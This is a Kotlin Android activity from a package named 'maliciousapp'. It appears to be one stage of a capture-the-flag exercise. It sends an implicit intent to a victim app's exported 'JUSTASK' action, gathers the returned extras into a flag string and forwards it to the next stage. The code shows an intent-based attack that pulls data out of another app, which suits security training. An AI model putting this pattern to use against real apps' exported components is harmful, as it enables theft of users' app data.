package com.example.maliciousapp

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class PartTwo : AppCompatActivity() {
    var flag = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        flag = intent?.getStringExtra("flag") ?: "[null]"

        val sendIntent = Intent("com.example.victimapp.intent.action.JUSTASK")
        startActivityForResult(sendIntent, 2)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
        super.onActivityResult(resultCode, resultCode, intent)

        val view = findViewById<TextView>(R.id.debug_text)
        intent?.getExtras()?.let { extras ->
            flag += extras
                .keySet()
                .fold("") { acc, key -> acc + extras.getCharSequence(key) }
            view.text = flag

            startActivity(
                Intent(this, PartThree::class.java)
                    .putExtra("flag", flag)
            )
        }
    }
}
